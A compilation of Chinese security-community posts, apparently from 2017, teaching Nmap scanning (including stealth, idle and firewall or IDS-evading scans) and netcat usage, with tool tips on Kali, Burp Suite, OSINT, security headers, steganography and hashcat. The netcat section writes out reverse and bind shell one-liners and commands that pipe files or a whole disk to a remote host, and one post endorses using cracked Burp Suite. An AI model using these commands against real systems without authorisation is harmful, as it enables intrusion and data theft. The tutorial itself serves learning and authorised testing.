+ Nmap使用教程

Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。

Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测/防御系统，以获得正确的结果。下面是一些基本的命令和它们的用法的例子：

扫描单一的一个主机，命令如下：

```
nmap nxadmin.com
nmap 192.168.1.2
```

扫描整个子网,命令如下:

```
nmap 192.168.1.1/24
```

扫描多个目标,命令如下：

```
nmap 192.168.1.2 192.168.1.5
```

扫描一个范围内的目标,如下：

```
nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)
```

如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：

```
nmap -iL ip.txt （该文件里面，一行保存一个ip）
```

如果你想看到你扫描的所有主机的列表，用以下命令: `nmap -sL 192.168.1.1/24`
（适用于快速列出该网段的存活主机,我一般这样用 `nmap -sL  192.168.1.1/24 |grep "(*)"`目的是仅列出存活的）


扫描除过某一个ip外的所有子网主机,命令：

```
nmap 192.168.1.1/24 -exclude 192.168.1.1
```

扫描除过某一个文件中的ip外的子网主机命令

```
nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)
```

扫描特定主机上的80,21,23端口,命令如下

```
nmap -p80,21,23 192.168.1.1
```

在每次命令都加上 -v 或者-vv 参数，会详细显示扫描的过程，不然你就等待一段时间，直接看结果。

从上面我们已经了解了Nmap的基础知识，下面我们深入的探讨一下Nmap的扫描技术.

✊Tcp SYN Scan (sS)
这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.
如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.
(这里我简单讲一下TCP 和SYN的区别，TCP有完整的三次握手过程，就是扫描器发包到探测目标上，然后目标会再返回确认包，然后双方确认后再传送数据，TCP过程繁琐当然扫描效率不高，并且有交互过程所以会在目标上留下日志。而SYN只是TCP三次握手中第一次握手的请求包，扫描过程速度快并且不会在目标上留下日志，我这里只是通俗的讲一下，不了解TCP的，参考这里
[简析TCP的三次握手与四次分手 | 果冻想](http://www.jellythink.com/archives/705))


```
nmap -sS 192.168.1.1
```

✊Tcp connect() scan(sT)
如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.

```
nmap -sT 192.168.1.1
```

Udp scan(sU)
顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.

```
nmap -sU 192.168.1.1
```

✊FIN scan (sF)
有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.

```
root@bt:~# nmap -sF 192.168.1.8
Starting Nmap 5.51  at 2012-07-08 19:21 PKT
Nmap scan report for 192.168.1.8
Host is up (0.000026s latency).
Not shown: 999 closed ports
PORT STATE SERVICE
111/tcp open|filtered rpcbind
```

FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.（如果你懂tcp协议，就知道FIN是TCP中一个请求断开的标志）

PING Scan (sP)
PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.

```
nmap -sP 192.168.1.1
```

✊版本检测(sV)
版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.

```
nmap -sV 192.168.1.1
```

Idle scan (sI)（s后面是大写I）
Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.

```
nmap -sI 192.168.1.6 192.168.1.1
```

Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口
（这个idle scan，是不能随便想利用哪个ip做为掩饰的，必须找到idle也就是空闲的主机，这个可以到后面我介绍msf知识的时候，有方法可以探测哪个主机目前是idle状态可以拿来掩盖自己ip）
另外还有其它的扫描方式，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.

✊Nmap的OS检测（O）
Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。

```
Initiating SYN Stealth Scan at 10:21
Scanning localhost (www.nxadmin.com) [1000 ports]
Discovered open port 111/tcp on www.nxadmin.com
Completed SYN Stealth Scan at 10:21, 0.08s elapsed (1000 total ports)
Initiating OS detection (try #1) against localhost (www.nxadmin.com)
Retrying OS detection (try #2) against localhost (www.nxadmin.com)
```

上面的例子清楚地表明，Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）

Nmap的操作系统指纹识别技术：

+ 设备类型（路由器，工作组等）
+ 运行（运行的操作系统）
+ 操作系统的详细信息（操作系统的名称和版本）
+ 网络距离（目标和攻击者之间的距离跳）

如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。

```
nmap -O -PN 192.168.1.1/24
```

以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.
Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误： `Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`



```
nmap -A 192.168.1.1
```

这个-A 是直接包含了很多功能，免去了敲多个参数的操作，所探测的信息，留给你去动手试一下吧。

在msf里面是可以调用nmap的，输入db_nmap 直接调用，扫描结果保存到msf数据库中。
一下子就长篇大论了，大多数人肯定都不会看完，这种必会的工具，还是建议每个参数都去敲着看看效果吧！
另外附上 新手小伙伴容易上手的视频: 

[https://www.ichunqiu.com/course/1219](https://www.ichunqiu.com/course/1219)


当然还有更全面从入门到精通的资料: 

[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

里面包含所有参数的详细讲解，其中的躲避IDS侦测值得好好掌握。
我准备上msf系列了，大家有什么建议？

<img src="https://images.xiaomiquan.com/Fv6VwvjGa2LBcpydgnPVhnptTSzW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:d4r-ehPgr0QLD4txOIj51m9Jpcc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 最好讲下nmap躲避ids.另外非常期待您的msf

<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 自己可以看文档啊，
[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap带脚本扫描感觉不怎么好用，命中率一般而且慢。

<img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 

```
--max-rtt-timeout 2000ms  连接超时为2000毫秒
--max-retries 3 丢包重试最多3次
--max-scan-delay 2s 发包间隔时间最多2秒
--host-timeout 30m 每台主机最多扫描30分钟
```

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 👍

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 最好讲下nmap躲避防火墙，谢谢

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 防火墙不是躲避，而是突破.如果常规的syn半连接扫描被防火墙阻止，可以尝试用其它方式去扫描，比如 (-PA )，这是用Ack方式，又或者(-sF),Fin方式扫描，nmap很强大可以定制各种数据包格式去扫描，如果是绕过IDS入侵防御检测，有很多方式，如果你看过我贴的两个网址的东西，你是有答案的。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 谢谢分享，无聊的周末看看老司机们的分享，又燃起了斗志，自从加了小密圈，忘了我是单身狗😜。关于msf，看到flipper也有系列，觉得是不是需要沟通一下，免得重复了，另外希望有实战的分享😁

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯，谢谢提醒，我们会商量下。

...

---

## nc



<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-02:


__#工具#__

基础工具篇之NC
NC 是一个大家都知道的经典工具，可以说它已经比较老旧了，但是我还是认为从事安全工作必须能熟练应用它，因为它不仅功能强大，最最重要是类Linux系统都内置已经存在了。估计大多数人对它功能知晓不全。

1. 监听端口
     `nc -l -p 5000`  (-l设置监听模式；-p设置监听端口)，这个大家用的最多可能是拿来接收反弹shell，就不多说了。
2. 连接端口
     `nc -nv 192.168.1.1 80` (-n 设置不解析域名，直接通过ip来连接； -v 显示详细的输出内容)，IP后面跟的是要连     接的端口，用的最多的应该还是直接连接一个开了监听端口的后门，其实它可以连接一些端口获取banner并执行一     些指令模拟发包。
     一端执行监听，一边用nc连接，那么双方可以发送一些文本信息，来模拟一个聊天工具，当然这在实际中没什么     用，不过变通一下就能起到作用了。
     A:`nc -lp 5000`   B: `ps | nc -nv 192.168.1.1 5000`
     A监听端口，B执行命令并将命令回显通过nc传输到A端的屏幕上显示，这常常应用在一些电子取证的场景上，我     们不希望在取证目标磁盘上写入任何东西。就可以通过这种方式来采集目标上的一些信息。
     当然你A端可以直接 `nc -l -p 5000 > ps.txt`,将接收到的信息直接写入文件。
3. 传输文件
     A: `nc -lp 5000 > 123.log`    B: `nc -nv 192.168.1.1 5000 < /var/message.log -q 1`  (这里-q代表传输完成后1 秒就断开连接)
     也可以变换成这样反向来传输   A: `nc -nv 192.168.1.1 5000 > 123.log`    B: `nc -lp 5000 < /var/message.log     -q 1`（谁连接这个端口，就自动把message.log发送过去）
4. 传输目录
     A: `tar -cvf - /tmp | nc -lp 5000 -q 1` (先将/tmp 目录进行打包注意cvf 后面有一个（-）符合，并通过管道符     将数据重定向到nc监听上)
     B: `nc -nv 192.168.1.1 5000 | tar -xvf -`   (接收到的数据重定向给tar解包)
5. 端口扫描
     `nc -nvz 192.168.1.1 1-65535` (-z代表扫描模式，不会进行I/O 信息交换，仅仅探测端口开放)
     `nc -nvzu 192.168.1.1 1-65535` (-u 代表通过upd方式扫描)
     nc肯定不能代替扫描器，精确度也不怎么好，不建议使用。
6. 硬盘克隆
     A: `nc -lp 5000 | dd of=/dev/sda` (nc监听5000端口，将接收到的数据，通过dd of，将数据完整写到/dev     /sda 磁盘上)
     B: `dd if=/dev/sda | nc -nv 192.168.1.1 5000 -q 1` (通过dd if 将/dev/sda 硬盘进行克隆，这个是从硬盘底     层数据的扇区、块上进行复制，克隆出来将会是状态完全一样的硬盘，通过管道重定向给nc命令并传送到远程ip上)
     这个功能常常会用在电子取证上，克隆出一个一样的硬盘，进行数据分析。当然不仅复制硬盘，也可以复制受害机     器的内存。(/proc 文件夹下是内存中的数据)
7. 发送shell
     A: `nc -lp 5000 -c bash`  (-c 调用bash做为交互,如果是windows下改为-e cmd)
     B： `nc -nv 192.168.1.1 5000`
     当然也可以反向发送shell
     A: `nc -nv 192.168.1.1 5000 -c bash`
     B: `nc -lp 5000`
    
弦哥，刚刚转的TK传授的学习方法，学习一个工具，要去看它每个参数，并弄懂其作用，现附上参数中文翻译

语法 nc/netcat(选项)(参数)
选项 

```
-g<网关>：设置路由器跃程通信网关，最多设置8个；
-d 无命令行界面，使用后台模式
-c 程序重定向，比如-c bash，nc传输过来的数据就会指向bash去执行
-e 这个也是程序重定向，用在windows下
-G<指向器数目>：设置来源路由指向器，其数值为4的倍数；
-h：在线帮助； -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口；
-l：使用监听模式，监控传入的资料；
-L：也是用作监听，不过监听端不终止nc的话，连接端终止后，监听端依然保持监听状态。
-n：直接使用ip地址，而不通过域名服务器；
-o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
-p<通信端口>：设置本地主机使用的通信端口；
-r：指定源端口和目的端口都进行随机的选择；
-s<来源位址>：设置本地主机送出数据包的IP地址；
-u：使用UDP传输协议；
-v：显示指令执行过程；
-w<超时秒数>：设置等待连线的时间，一般扫描时加上；
-z：使用0输入/输出模式，只在扫描通信端口时使用。
```

欢迎大家提交更多的使用方法！



...

<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 请问我使用参数-q 1文件传完没有自动断开，我使用-w 1可以自动断开，这两个参数有什么区别？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 你是在传输那边加的-q 1吗？-w 是设置超时时间，一般用在扫描端口上，探测某个端口没反应的等待时间

<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 感谢大大解答。找到原因了，是弄反了，另外比较了一下，linux版带-q，windows版的nc没-q，而且少好几个参数。

...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-03:


__#姿势#__

 
__#python#__

 

刚好之前ke分享了netcat的使用，这次为大家分享一下如何使用python编写一个简单的python版的netcat。


[python编写简单netcat | D_infinite的小站](http://dinfinite.cn/2017/07/03/python%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95netcat/)



还是一样，有任何问题和建议欢迎评论区留言，咱们共同分享，共同进步。



---


## Kali

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

推荐 katoolin 快速安装 Kali 任意工具


[GitHub - LionSec/katoolin: Automatically install a...](https://github.com/LionSec/katoolin)

 

Ubuntu 下体验还不错，看源码可以发现是添加了 Kali 的源，然后 apt-get install 安装。

有时候我们的 VPS 是 Ubuntu，想快速安装一些 Kali 里的好工具，就用 katoolin 即可。

BTW：很多开源工具都是 Python 写的，我们在用爽的同时不妨学习下其源码，如果发现 bug 还可以去对应的 GitHub 上提交修正。这种互动很值得鼓励。

<img src="https://images.xiaomiquan.com/FtLBOd503NNTsOrwDZWvfpyYT-Tf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7VBoWHu9g1ANgaguRGMOKa5Kyq4=" width="50%" height="50%" align="middle"/>

---

## Burp Suite


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#工具#__

Burp Suite 1.7.26 发布，其中增加了个先进功能“文件上传漏洞发现”，支持这些格式的嵌入上传：
PDF, SVG, HTML, PHP, SSI.

并且支持外带回显。

Web 黑必备神器，有钱就买吧，没钱就等破解版。


[http://releases.portswigger.net/2017/08/1726.html](http://releases.portswigger.net/2017/08/1726.html)



<img src="https://images.xiaomiquan.com/Fp11Wh8SEBk47NN32yFfqOQCjiKZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:j0zRyAqkqR8_latcqru_yIR-0UA=" width="50%" height="50%" align="middle"/>


---


---

## nethunter


<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-06-28:

玩黑手的大伙儿估计都知道nethunter，很不错的黑手套装，只是有些机型比较难刷。今天推一个不一样的黑手玩法：How about a complete Linux on your phone?

Linuxdeploy(play商店有下)能够在root过的安卓手机上安装完整Linux系统，目前支持的发行版有Debian, Ubuntu, Kali Linux, Arch Linux, Fedora, CentOS, Gentoo, openSUSE, Slackware, RootFS 
功能非常之强大，还支持好几种GUI，更多功能有待大家慢慢把玩

Play商店下载地址
[https://play.google.com/store/apps/details?id=ru.m...](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)



另外，linuxdeploy还是开源的！

[GitHub - meefik/linuxdeploy: Install and run GNU/L...](https://github.com/meefik/linuxdeploy)



有的同学可能会觉得手机上键盘是个痛点，没关系我们有hacker keyboard

[https://play.google.com/store/apps/details?id=org....](https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard)




What you can do on Linux, you can do the same on your PHONE

<img src="https://images.xiaomiquan.com/FmquZZWgZvzfY2fLJ_thKf6q6ViE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ef1vBeGiGMuP6yZL7GL_xOsWYK4=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiIojwNo0_ehijjifjOMjddpRrLi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gFWPK2hQHtn_DnSZemaTZ6_hvtM=" width="50%" height="50%" align="middle"/>


---


## OSINT


<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-05-31:

> 匿名用户 提问：
看到小密圈安全平台，毫不犹豫的订了，想问一下，一直困扰我的问题，在国外有专门有基于互联网信息收集的工具，有基于twitter，或facebook的信息收集工具如meltago，有google hacking,在国内有类似基于QQ号码或微搏帐号收集工具吗，如果有，有哪些，非常感谢。有类似baidu hacking的东西吗


暂时没看到这样全面的，国内这种环境，限制了这类工具的发展与分享。

不过前几天我们看到这个：

[GitHub - jm33-m0/massExpConsole: adding more exploits and tools](https://github.com/jm33-m0/massExpConsole)



里面有集成国内的 Baidu、ZoomEye，可以看看。

顺便补充，这类工具我们称为 OSINT，在之前发布的“渗透技能树之利器”里有专门归类。

如果谁写了个这样的好工具，可以分享一下。



...

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: OSINT的目的是什么？

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ replies to <img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: 各种情报集合汇总

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 新词get√


...

---

## Secure Headers



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:


__#工具#__

  HTTP 响应头安全审计工具


[GitHub - m3liot/shcheck: Just a small tool to chec...](https://github.com/m3liot/shcheck)



Python 写的，代码很短很简单，审计原理也特别简单，审计如下响应安全头是否存在：

```
sec_headers = {
    'X-XSS-Protection': 'warning',
    'X-Frame-Options': 'warning',
    'X-Content-Type-Options': 'warning',
    'Strict-Transport-Security': 'alert',
    'Public-Key-Pins': 'none',
    'Content-Security-Policy': 'warning',
    'X-Permitted-Cross-Domain-Policies': 'warning',
    'Referrer-Policy': 'warning'

}
```

如果对 Python 及 HTTP 协议感兴趣的，可以读一遍这段代码。遇到不懂的百度/Google 就好，比如上面那些安全头分别是用来干什么的。

然后可以思考，这个工具还应该完善些什么？

欢迎交流。

<img src="https://images.xiaomiquan.com/FplPjJkSHarVCGj6gNrbtY5s0TmT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:_-1-Kcu2jTj3xUOglzJTP5m6-GA=" width="50%" height="50%" align="middle"/>


...


<img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 我的理解是这个程序只检测了header是否存在，根本没管具体的值是什么。所以可以改进的点是根据具体header，再监测内容是否合法。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 有一些判断的

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 根据响应头的值，来做更多的分析？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 这些安全头部应用好的话可以防御不少前端安全问题

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 弦大，刚把代码读了一遍大概是判断返回的headers里面是否有安全头  调试的时候尝试了下某宝和度娘 某宝只有一个https的 度娘一个也没有  不止这些头意义是否很大  因为在例子里面看了Facebook拥有4个~~

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 我认为如果没有缺少某个安全头后可以对其进一步得分析与攻击。

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: HTTP头介绍较全 
[List of HTTP header fields - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: 不错

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些http头是跟浏览器相关的，工具可以添加模拟不同浏览器功能，去请求分析，httpt头是否有相应的安全设置；

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 关于这些响应安全头的介绍，大家可以看 OWASP 这个链接：
[OWASP Secure Headers Project - OWASP](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers)


...

---


## 隐写



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> [§] 提问：
余大大，我想请教一下：我想用Python写一个可以批量检测图片是否隐藏了其他东西的工具，包括检测出使用的是何种隐写术，不知道这个想法能否实现，若可以实现，需要掌握哪些隐写术，可否提供一些参考资料学习学习。谢谢！


这个好问题，可惜我们没实战过，思路倒是可以去看看都有哪些隐写技术，知己知彼，比如 Freebuf 搜下隐写，好些文章。



...

<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[GitHub - Owlz/stegoVeritas: Yet another Stego Tool](https://github.com/Owlz/stegoVeritas)

<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[图片隐写术总结 – 850's Blog](http://850.world/2017/04/12/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/#comment-4)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: Great

<img src="https://file.xiaomiquan.com/8b/f8/8bf8ed658903935055a1d9bc9b13cb9ff0ed77f145e07625f80765a1cc1da9c0.jpg" width="25px"/> __[§]__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 谢谢！学习学习


...

---


## Cracking



<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-09:

> 匿名用户 提问：
在有一定硬件支持下，想自己用服务器塔成专门跑密码的，目前只是下载了彩虹表 和其它之类跑简单密码大概1.5T，  请问一下你们在公司肯定也有专门跑密码的方案吧？  比如像 WordPress之类的密码和系统以及无线的密码？ 用什么工具以等。  能参考下或者提下意见么？


没，不过你可以试试 hashcat



...

